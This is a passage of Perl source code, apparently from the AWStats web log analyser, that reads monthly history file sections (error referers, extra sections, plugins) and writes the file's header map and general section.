$withupdate || $HTMLOutput{\"errors$code\"} )\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\tmy $fieldidx = 2;\n\t\t\t\t\t\t\t\t\tforeach (split(//, $ShowHTTPErrorsPageDetail)) {\n\t\t\t\t\t\t\t\t\t\tlast if (! $field[$fieldidx] );\n\t\t\t\t\t\t\t\t\t\tif ( $_ =~ /R/i ) {\n\t\t\t\t\t\t\t\t\t\t\t$_referer_h{$code}{$field[0]} = $field[2];\n\t\t\t\t\t\t\t\t\t\t} elsif ( $_ =~ /H/i ) {\n\t\t\t\t\t\t\t\t\t\t\t$_err_host_h{$code}{$field[0]} = $field[$fieldidx];\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t$fieldidx++;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\t\tchomp $_;\n\t\t\t\t\t\ts/\\r//;\n\t\t\t\t\t\t@field = split(\n\t\t\t\t\t\t\t/\\s+/,\n\t\t\t\t\t\t\t(\n\t\t\t\t\t\t\t\t$readxml\n\t\t\t\t\t\t\t\t? XMLDecodeFromHisto($_)\n\t\t\t\t\t\t\t\t: $_\n\t\t\t\t\t\t\t)\n\t\t\t\t\t\t);\n\t\t\t\t\t\t$countlines++;\n\t\t\t\t\t  } until ( $field[0] eq \"END_SIDER_$code\"\n\t\t\t\t\t\t  || $field[0] eq \"${xmleb}END_SIDER_$code\"\n\t\t\t\t\t\t  || !$_ );\n\t\t\t\t\tif (   $field[0] ne \"END_SIDER_$code\"\n\t\t\t\t\t\t&& $field[0] ne \"${xmleb}END_SIDER_$code\" )\n\t\t\t\t\t{\n\t\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section SIDER_$code not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\" End of SIDER_$code section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\tdelete $SectionsToLoad{\"sider_$code\"};\n\t\t\t\t\tif ( $SectionsToSave{\"sider_$code\"} ) {\n\t\t\t\t\t\tSave_History( \"sider_$code\", $year, $month, $date );\n\t\t\t\t\t\tdelete $SectionsToSave{\"sider_$code\"};\n\t\t\t\t\t\tif ($withpurge) {\n\t\t\t\t\t\t\t%_sider_h   = ();\n\t\t\t\t\t\t\t%_referer_h = ();\n\t\t\t\t\t\t\t%_err_host_h = ();\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t# BEGIN_EXTRA_xxx\n\t\t\tforeach my $extranum ( 1 .. @ExtraName - 1 ) {\n\t\t\t\tif ( $field[0] eq \"BEGIN_EXTRA_$extranum\" ) {\n\t\t\t\t\tif ($Debug) { debug(\" Begin of EXTRA_$extranum\"); }\n\t\t\t\t\t$field[0] = '';\n\t\t\t\t\tmy $count       = 0;\n\t\t\t\t\tmy $countloaded = 0;\n\t\t\t\t\tdo {\n\t\t\t\t\t\tif ( $field[0] ne '' ) {\n\t\t\t\t\t\t\t$count++;\n\t\t\t\t\t\t\tif ( $SectionsToLoad{\"extra_$extranum\"} ) {\n\t\t\t\t\t\t\t\tif (   $ExtraStatTypes[$extranum] =~ /P/i\n\t\t\t\t\t\t\t\t\t&& $field[1] )\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t${ '_section_' . $extranum . '_p' }\n\t\t\t\t\t\t\t\t\t  { $field[0] } += $field[1];\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t${ '_section_' . $extranum . '_h' }\n\t\t\t\t\t\t\t\t  { $field[0] } += $field[2];\n\t\t\t\t\t\t\t\tif (   $ExtraStatTypes[$extranum] =~ /B/i\n\t\t\t\t\t\t\t\t\t&& $field[3] )\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t${ '_section_' . $extranum . '_k' }\n\t\t\t\t\t\t\t\t\t  { $field[0] } += $field[3];\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $ExtraStatTypes[$extranum] =~ /L/i\n\t\t\t\t\t\t\t\t\t&& !${ '_section_' . $extranum . '_l' }\n\t\t\t\t\t\t\t\t\t{ $field[0] }\n\t\t\t\t\t\t\t\t\t&& $field[4] )\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t${ '_section_' . $extranum . '_l' }\n\t\t\t\t\t\t\t\t\t  { $field[0] } = int( $field[4] );\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\t\tchomp $_;\n\t\t\t\t\t\ts/\\r//;\n\t\t\t\t\t\t@field = split(\n\t\t\t\t\t\t\t/\\s+/,\n\t\t\t\t\t\t\t(\n\t\t\t\t\t\t\t\t$readxml\n\t\t\t\t\t\t\t\t? XMLDecodeFromHisto($_)\n\t\t\t\t\t\t\t\t: $_\n\t\t\t\t\t\t\t)\n\t\t\t\t\t\t);\n\t\t\t\t\t\t$countlines++;\n\t\t\t\t\t  } until ( $field[0] eq \"END_EXTRA_$extranum\"\n\t\t\t\t\t\t  || $field[0] eq \"${xmleb}END_EXTRA_$extranum\"\n\t\t\t\t\t\t  || !$_ );\n\t\t\t\t\tif (   $field[0] ne \"END_EXTRA_$extranum\"\n\t\t\t\t\t\t&& $field[0] ne \"${xmleb}END_EXTRA_$extranum\" )\n\t\t\t\t\t{\n\t\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section EXTRA_$extranum not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\" End of EXTRA_$extranum section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\tdelete $SectionsToLoad{\"extra_$extranum\"};\n\t\t\t\t\tif ( $SectionsToSave{\"extra_$extranum\"} ) {\n\t\t\t\t\t\tSave_History( \"extra_$extranum\", $year, $month, $date );\n\t\t\t\t\t\tdelete $SectionsToSave{\"extra_$extranum\"};\n\t\t\t\t\t\tif ($withpurge) {\n\t\t\t\t\t\t\t%{ '_section_' . $extranum . '_p' } = ();\n\t\t\t\t\t\t\t%{ '_section_' . $extranum . '_h' } = ();\n\t\t\t\t\t\t\t%{ '_section_' . $extranum . '_b' } = ();\n\t\t\t\t\t\t\t%{ '_section_' . $extranum . '_l' } = ();\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t# BEGIN_PLUGINS\n\t\t\tif (   $AtLeastOneSectionPlugin\n\t\t\t\t&& $field[0] =~ /^BEGIN_PLUGIN_(\\w+)$/i )\n\t\t\t{\n\t\t\t\tmy $pluginname = $1;\n\t\t\t\tmy $found      = 0;\n\t\t\t\tforeach ( keys %{ $PluginsLoaded{'SectionInitHashArray'} } ) {\n\t\t\t\t\tif ( $pluginname eq $_ ) {\n\n\t\t\t\t\t\t# The plugin for this section was loaded\n\t\t\t\t\t\t$found = 1;\n\t\t\t\t\t\tmy $issectiontoload =\n\t\t\t\t\t\t  $SectionsToLoad{\"plugin_$pluginname\"};\n\n#               \t\t    my $function=\"SectionReadHistory_$pluginname(\\$issectiontoload,\\$readxml,\\$xmleb,\\$countlines)\";\n#               \t\t    eval(\"$function\");\n\t\t\t\t\t\tmy $function = \"SectionReadHistory_$pluginname\";\n\t\t\t\t\t\t&$function( $issectiontoload, $readxml, $xmleb,\n\t\t\t\t\t\t\t$countlines );\n\t\t\t\t\t\tdelete $SectionsToLoad{\"plugin_$pluginname\"};\n\t\t\t\t\t\tif ( $SectionsToSave{\"plugin_$pluginname\"} ) {\n\t\t\t\t\t\t\tSave_History( \"plugin_$pluginname\",\n\t\t\t\t\t\t\t\t$year, $month, $date );\n\t\t\t\t\t\t\tdelete $SectionsToSave{\"plugin_$pluginname\"};\n\t\t\t\t\t\t\tif ($withpurge) {\n\n#                           \t\tmy $function=\"SectionInitHashArray_$pluginname()\";\n#                           \t\teval(\"$function\");\n\t\t\t\t\t\t\t\tmy $function =\n\t\t\t\t\t\t\t\t  \"SectionInitHashArray_$pluginname\";\n\t\t\t\t\t\t\t\t&$function();\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\n\t\t\t\t# The plugin for this section was not loaded\n\t\t\t\tif ( !$found ) {\n\t\t\t\t\tdo {\n\t\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\t\tchomp $_;\n\t\t\t\t\t\ts/\\r//;\n\t\t\t\t\t\t@field = split(\n\t\t\t\t\t\t\t/\\s+/,\n\t\t\t\t\t\t\t(\n\t\t\t\t\t\t\t\t$readxml\n\t\t\t\t\t\t\t\t? XMLDecodeFromHisto($_)\n\t\t\t\t\t\t\t\t: $_\n\t\t\t\t\t\t\t)\n\t\t\t\t\t\t);\n\t\t\t\t\t\t$countlines++;\n\t\t\t\t\t  } until ( $field[0] eq \"END_PLUGIN_$pluginname\"\n\t\t\t\t\t\t  || $field[0] eq \"${xmleb}END_PLUGIN_$pluginname\"\n\t\t\t\t\t\t  || !$_ );\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n# For backward compatibility (ORIGIN section was \"HitFromx\" in old history files)\n\t\t\tif ( $SectionsToLoad{'origin'} ) {\n\t\t\t\tif ( $field[0] eq 'HitFrom0' ) {\n\t\t\t\t\t$_from_p[0] += 0;\n\t\t\t\t\t$_from_h[0] += $field[1];\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t\tif ( $field[0] eq 'HitFrom1' ) {\n\t\t\t\t\t$_from_p[1] += 0;\n\t\t\t\t\t$_from_h[1] += $field[1];\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t\tif ( $field[0] eq 'HitFrom2' ) {\n\t\t\t\t\t$_from_p[2] += 0;\n\t\t\t\t\t$_from_h[2] += $field[1];\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t\tif ( $field[0] eq 'HitFrom3' ) {\n\t\t\t\t\t$_from_p[3] += 0;\n\t\t\t\t\t$_from_h[3] += $field[1];\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t\tif ( $field[0] eq 'HitFrom4' ) {\n\t\t\t\t\t$_from_p[4] += 0;\n\t\t\t\t\t$_from_h[4] += $field[1];\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t\tif ( $field[0] eq 'HitFrom5' ) {\n\t\t\t\t\t$_from_p[5] += 0;\n\t\t\t\t\t$_from_h[5] += $field[1];\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\tif ($withupdate) {\n\n# Process rest of data saved in 'wait' arrays (data for hosts that are not in history file or no history file found)\n# This can change some values for day, sider and session sections\n\t\tif ($Debug) { debug( \" Processing data in 'wait' arrays\", 3 ); }\n\t\tforeach ( keys %_waithost_e ) {\n\t\t\tif ($Debug) {\n\t\t\t\tdebug( \"  Visit in 'wait' array for $_ is a new visit\", 4 );\n\t\t\t}\n\t\t\tmy $newtimehosts =\n\t\t\t  ( $_waithost_s{$_} ? $_waithost_s{$_} : $_host_s{$_} );\n\t\t\tmy $newtimehostl =\n\t\t\t  ( $_waithost_l{$_} ? $_waithost_l{$_} : $_host_l{$_} );\n\t\t\t$_url_e{ $_waithost_e{$_} }++;\n\t\t\t$newtimehosts =~ /^(\\d\\d\\d\\d\\d\\d\\d\\d)/;\n\t\t\t$DayVisits{$1}++;\n\t\t\tif ( $_waithost_s{$_} ) {\n\n\t\t\t\t# There was also a second session in processed log\n\t\t\t\t$_session{ GetSessionRange( $newtimehosts, $newtimehostl ) }++;\n\t\t\t}\n\t\t}\n\t}\n\n# Write all unwrote sections in section order ('general','time', 'day','sider','session' and other...)\n\tif ($Debug) {\n\t\tdebug(\n\t\t\t\" Check and write all unwrote sections: \"\n\t\t\t  . join( ',', keys %SectionsToSave ),\n\t\t\t2\n\t\t);\n\t}\n\tforeach my $key (\n\t\tsort { $SectionsToSave{$a} <=> $SectionsToSave{$b} }\n\t\tkeys %SectionsToSave\n\t  )\n\t{\n\t\tSave_History( \"$key\", $year, $month, $date, $lastlinenb,\n\t\t\t$lastlineoffset, $lastlinechecksum );\n\t}\n\t%SectionsToSave = ();\n\n# Update offset in map section and last data in general section then close files\n\tif ($withupdate) {\n\t\tif ($xml) { print HISTORYTMP \"\\n\\n</xml>\\n\"; }\n\n\t\t# Update offset of sections in the MAP section\n\t\tforeach ( sort { $PosInFile{$a} <=> $PosInFile{$b} } keys %ValueInFile )\n\t\t{\n\t\t\tif ($Debug) {\n\t\t\t\tdebug(\n\" Update offset of section $_=$ValueInFile{$_} in file at offset $PosInFile{$_}\"\n\t\t\t\t);\n\t\t\t}\n\t\t\tif ( $PosInFile{\"$_\"} ) {\n\t\t\t\tseek( HISTORYTMP, $PosInFile{\"$_\"}, 0 );\n\t\t\t\tprint HISTORYTMP $ValueInFile{\"$_\"};\n\t\t\t}\n\t\t}\n\n\t\t# Save last data in general sections\n\t\tif ($Debug) {\n\t\t\tdebug(\n\" Update MonthVisits=$MonthVisits{$year.$month} in file at offset $PosInFile{TotalVisits}\"\n\t\t\t);\n\t\t}\n\t\tseek( HISTORYTMP, $PosInFile{\"TotalVisits\"}, 0 );\n\t\tprint HISTORYTMP $MonthVisits{ $year . $month };\n\t\tif ($Debug) {\n\t\t\tdebug(\n\" Update MonthUnique=$MonthUnique{$year.$month} in file at offset $PosInFile{TotalUnique}\"\n\t\t\t);\n\t\t}\n\t\tseek( HISTORYTMP, $PosInFile{\"TotalUnique\"}, 0 );\n\t\tprint HISTORYTMP $MonthUnique{ $year . $month };\n\t\tif ($Debug) {\n\t\t\tdebug(\n\" Update MonthHostsKnown=$MonthHostsKnown{$year.$month} in file at offset $PosInFile{MonthHostsKnown}\"\n\t\t\t);\n\t\t}\n\t\tseek( HISTORYTMP, $PosInFile{\"MonthHostsKnown\"}, 0 );\n\t\tprint HISTORYTMP $MonthHostsKnown{ $year . $month };\n\t\tif ($Debug) {\n\t\t\tdebug(\n\" Update MonthHostsUnknown=$MonthHostsUnknown{$year.$month} in file at offset $PosInFile{MonthHostsUnknown}\"\n\t\t\t);\n\t\t}\n\t\tseek( HISTORYTMP, $PosInFile{\"MonthHostsUnknown\"}, 0 );\n\t\tprint HISTORYTMP $MonthHostsUnknown{ $year . $month };\n\t\tclose(HISTORYTMP) || error(\"Failed to write temporary history file\");\n\t}\n\tif ($withread) {\n\t\tclose(HISTORY) || error(\"Command for pipe '$filetoread' failed\");\n\t}\n\n\t# Purge data\n\tif ($withpurge) { &Init_HashArray(); }\n\n\t# If update, rename tmp file bis into tmp file or set HistoryAlreadyFlushed\n\tif ($withupdate) {\n\t\tif ( $HistoryAlreadyFlushed{\"$year$month$day$hour\"} ) {\n\t\t\tdebug(\n\t\t\t\t\"Rename tmp history file bis '$filetoread' to '$filetowrite'\");\n\t\t\tif ( rename( $filetowrite, $filetoread ) == 0 ) {\n\t\t\t\terror(\"Failed to update tmp history file $filetoread\");\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\t$HistoryAlreadyFlushed{\"$year$month$day$hour\"} = 1;\n\t\t}\n\n\t\tif ( !$ListOfYears{\"$year\"} || $ListOfYears{\"$year\"} lt \"$month\" ) {\n\t\t\t$ListOfYears{\"$year\"} = \"$month\";\n\t\t}\n\t}\n\n\t# For backward compatibility, if LastLine does not exist, set to LastTime\n\t$LastLine ||= $LastTime{$date};\n\n\treturn ( $withupdate ? \"$filetowrite\" : \"\" );\n}\n\n#------------------------------------------------------------------------------\n# Function:\t\tSave a part of history file\n# Parameters:\tsectiontosave,year,month,breakdate[,lastlinenb,lastlineoffset,lastlinechecksum]\n# Input:\t\t$VERSION HISTORYTMP $nowyear $nowmonth $nowday $nowhour $nowmin $nowsec $LastLineNumber $LastLineOffset $LastLineChecksum\n# Output:\t\tNone\n# Return:\t\tNone\n#------------------------------------------------------------------------------\nsub Save_History {\n\tmy $sectiontosave = shift || '';\n\tmy $year          = shift || '';\n\tmy $month         = shift || '';\n\tmy $breakdate     = shift || '';\n\n\tmy $xml = ( $BuildHistoryFormat eq 'xml' ? 1 : 0 );\n\tmy (\n\t\t$xmlbb, $xmlbs, $xmlbe, $xmlhb, $xmlhs, $xmlhe,\n\t\t$xmlrb, $xmlrs, $xmlre, $xmleb, $xmlee\n\t  )\n\t  = ( '', '', '', '', '', '', '', '', '', '', '' );\n\tif ($xml) {\n\t\t(\n\t\t\t$xmlbb, $xmlbs, $xmlbe, $xmlhb, $xmlhs, $xmlhe,\n\t\t\t$xmlrb, $xmlrs, $xmlre, $xmleb, $xmlee\n\t\t  )\n\t\t  = (\n\t\t\t\"</comment><nu>\\n\", '</nu><recnb>',\n\t\t\t'</recnb><table>',  '<tr><th>',\n\t\t\t'</th><th>',        '</th></tr>',\n\t\t\t'<tr><td>',         '</td><td>',\n\t\t\t'</td></tr>',       '</table><nu>',\n\t\t\t\"\\n</nu></section>\"\n\t\t  );\n\t}\n\telse { $xmlbs = ' '; $xmlhs = ' '; $xmlrs = ' '; }\n\n\tmy $lastlinenb       = shift || 0;\n\tmy $lastlineoffset   = shift || 0;\n\tmy $lastlinechecksum = shift || 0;\n\tif ( !$lastlinenb ) {    # This happens for migrate\n\t\t$lastlinenb       = $LastLineNumber;\n\t\t$lastlineoffset   = $LastLineOffset;\n\t\t$lastlinechecksum = $LastLineChecksum;\n\t}\n\n\tif ($Debug) {\n\t\tdebug(\n\" Save_History [sectiontosave=$sectiontosave,year=$year,month=$month,breakdate=$breakdate,lastlinenb=$lastlinenb,lastlineoffset=$lastlineoffset,lastlinechecksum=$lastlinechecksum]\",\n\t\t\t1\n\t\t);\n\t}\n\tmy $spacebar      = \"                    \";\n\tmy %keysinkeylist = ();\n\n\t# Header\n\tif ( $sectiontosave eq 'header' ) {\n\t\tif ($xml) { print HISTORYTMP \"<version><lib>\\n\"; }\n\t\tprint HISTORYTMP \"AWSTATS DATA FILE $VERSION\\n\";\n\t\tif ($xml) { print HISTORYTMP \"</lib><comment>\\n\"; }\n\t\tprint HISTORYTMP\n\"# If you remove this file, all statistics for date $breakdate will be lost/reset.\\n\";\n\t\tprint HISTORYTMP\n\t\t  \"# Last config file used to build this data file was $FileConfig.\\n\";\n\t\tif ($xml) { print HISTORYTMP \"</comment></version>\\n\"; }\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP\n\"# Position (offset in bytes) in this file for beginning of each section for\\n\";\n\t\tprint HISTORYTMP\n\"# direct I/O access. If you made changes somewhere in this file, you should\\n\";\n\t\tprint HISTORYTMP\n\"# also remove completely the MAP section (AWStats will rewrite it at next\\n\";\n\t\tprint HISTORYTMP \"# update).\\n\";\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_MAP${xmlbs}\"\n\t\t  . ( 27 + ( scalar keys %TrapInfosForHTTPErrorCodes ) +\n\t\t\t  ( scalar @ExtraName ? scalar @ExtraName - 1 : 0 ) +\n\t\t\t  ( scalar keys %{ $PluginsLoaded{'SectionInitHashArray'} } ) )\n\t\t  . \"${xmlbe}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_GENERAL${xmlrs}\";\n\t\t$PosInFile{\"general\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\n\t\t# When\n\t\tprint HISTORYTMP \"${xmlrb}POS_TIME${xmlrs}\";\n\t\t$PosInFile{\"time\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_VISITOR${xmlrs}\";\n\t\t$PosInFile{\"visitor\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_DAY${xmlrs}\";\n\t\t$PosInFile{\"day\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\n\t\t# Who\n\t\tprint HISTORYTMP \"${xmlrb}POS_DOMAIN${xmlrs}\";\n\t\t$PosInFile{\"domain\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_LOGIN${xmlrs}\";\n\t\t$PosInFile{\"login\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_ROBOT${xmlrs}\";\n\t\t$PosInFile{\"robot\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_WORMS${xmlrs}\";\n\t\t$PosInFile{\"worms\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_EMAILSENDER${xmlrs}\";\n\t\t$PosInFile{\"emailsender\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_EMAILRECEIVER${xmlrs}\";\n\t\t$PosInFile{\"emailreceiver\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\n\t\t# Navigation\n\t\tprint HISTORYTMP \"${xmlrb}POS_SESSION${xmlrs}\";\n\t\t$PosInFile{\"session\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_SIDER${xmlrs}\";\n\t\t$PosInFile{\"sider\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_FILETYPES${xmlrs}\";\n\t\t$PosInFile{\"filetypes\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_DOWNLOADS${xmlrs}\";\n\t\t$PosInFile{'downloads'} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_OS${xmlrs}\";\n\t\t$PosInFile{\"os\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_BROWSER${xmlrs}\";\n\t\t$PosInFile{\"browser\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_SCREENSIZE${xmlrs}\";\n\t\t$PosInFile{\"screensize\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_UNKNOWNREFERER${xmlrs}\";\n\t\t$PosInFile{'unknownreferer'} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_UNKNOWNREFERERBROWSER${xmlrs}\";\n\t\t$PosInFile{'unknownrefererbrowser'} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\n\t\t# Referers\n\t\tprint HISTORYTMP \"${xmlrb}POS_ORIGIN${xmlrs}\";\n\t\t$PosInFile{\"origin\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_SEREFERRALS${xmlrs}\";\n\t\t$PosInFile{\"sereferrals\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_PAGEREFS${xmlrs}\";\n\t\t$PosInFile{\"pagerefs\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_SEARCHWORDS${xmlrs}\";\n\t\t$PosInFile{\"searchwords\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_KEYWORDS${xmlrs}\";\n\t\t$PosInFile{\"keywords\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\n\t\t# Others\n\t\tprint HISTORYTMP \"${xmlrb}POS_MISC${xmlrs}\";\n\t\t$PosInFile{\"misc\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_ERRORS${xmlrs}\";\n\t\t$PosInFile{\"errors\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_CLUSTER${xmlrs}\";\n\t\t$PosInFile{\"cluster\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\n\t\tforeach ( keys %TrapInfosForHTTPErrorCodes ) {\n\t\t\tprint HISTORYTMP \"${xmlrb}POS_SIDER_$_${xmlrs}\";\n\t\t\t$PosInFile{\"sider_$_\"} = tell HISTORYTMP;\n\t\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\t}\n\t\tforeach ( 1 .. @ExtraName - 1 ) {\n\t\t\tprint HISTORYTMP \"${xmlrb}POS_EXTRA_$_${xmlrs}\";\n\t\t\t$PosInFile{\"extra_$_\"} = tell HISTORYTMP;\n\t\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\t}\n\t\tforeach ( keys %{ $PluginsLoaded{'SectionInitHashArray'} } ) {\n\t\t\tprint HISTORYTMP \"${xmlrb}POS_PLUGIN_$_${xmlrs}\";\n\t\t\t$PosInFile{\"plugin_$_\"} = tell HISTORYTMP;\n\t\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_MAP${xmlee}\\n\";\n\t}\n\n\t# General\n\tif ( $sectiontosave eq 'general' ) {\n\t\t$LastUpdate = int(\"$nowyear$nowmonth$nowday$nowhour$nowmin$nowsec\");\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP\n\"# LastLine    = Date of last record processed - Last record line number in last log - Last record offset in last log - Last record signature value\\n\";\n\t\tprint HISTORYTMP\n\t\t  \"# FirstTime   = Date of first visit for history file\\n\";\n\t\tprint HISTORYTMP\n\t\t  \"# LastTime    = Date of last visit for history file\\n\";\n\t\tprint HISTORYTMP\n\"# LastUpdate  = Date of last update - Nb of parsed records - Nb of parsed old records - Nb of parsed new records - Nb of parsed corrupted - Nb of parsed dropped\\n\";\n\t\tprint HISTORYTMP \"# TotalVisits = Number of visits\\n\";\n\t\tprint HISTORYTMP \"# TotalUnique = Number of unique visitors\\n\";\n\t\tprint HISTORYTMP \"# MonthHostsKnown   = Number of hosts known\\n\";\n\t\tprint HISTORYTMP \"# MonthHostsUnKnown = Number of hosts unknown\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_GENERAL${xmlbs}8${xmlbe}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}LastLine${xmlrs}\"\n\t\t  . ( $LastLine > 0 ? $LastLine : $LastTime{$breakdate} )\n\t\t  . \" $lastlinenb $lastlineoffset $lastlinechecksum${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}FirstTime${xmlrs}\"\n\t\t  . $FirstTime{$breakdate}\n\t\t  . \"${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}LastTime${xmlrs}\"\n\t\t  . $LastTime{$breakdate}\n\t\t  . \"${xmlre}\\n\";\n\t\tprint HISTORYTMP\n\"${xmlrb}LastUpdate${xmlrs}$LastUpdate $NbOfLinesParsed 